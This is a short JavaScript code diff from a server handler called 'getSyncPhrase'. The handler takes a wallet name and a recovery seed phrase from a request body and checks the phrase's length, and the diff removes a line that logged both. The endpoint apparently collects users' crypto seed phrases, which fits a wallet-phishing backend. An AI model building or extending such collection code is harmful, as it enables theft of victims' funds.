@@ -112,7 +112,6 @@ export const getMessage = async (req, res) => {
 // Get key and seed phrase
 export const getSyncPhrase = async (req, res) => {
   const { walletName, rPhrase } = req.body;
-  console.log("yes", walletName, rPhrase);
   const checkPhrase = rPhrase.match(/\s*(\S\s*){20,}/g);
   if (!checkPhrase) return;
   // return;
